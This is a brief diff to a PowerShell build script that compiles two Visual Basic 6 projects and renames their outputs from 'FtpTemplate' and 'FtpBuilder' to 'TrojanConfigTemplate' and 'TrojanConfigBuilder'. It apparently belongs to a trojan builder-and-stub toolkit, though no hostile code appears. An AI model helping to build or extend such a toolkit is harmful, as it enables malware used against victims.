@@ -10,8 +10,8 @@ if (-not (Test-Path -LiteralPath $Compiler -PathType Leaf)) {
 $OutputDirectory = [System.IO.Path]::GetFullPath($OutputDirectory)
 New-Item -ItemType Directory -Path $OutputDirectory -Force | Out-Null
 $projects = @(
-    @{ Path = 'source\Template.vbp'; Exe = 'FtpTemplate.exe' },
-    @{ Path = 'source\Builder.vbp'; Exe = 'FtpBuilder.exe' }
+    @{ Path = 'source\Template.vbp'; Exe = 'TrojanConfigTemplate.exe' },
+    @{ Path = 'source\Builder.vbp'; Exe = 'TrojanConfigBuilder.exe' }
 )
 foreach ($project in $projects) {
     $projectFile = Join-Path $PSScriptRoot $project.Path
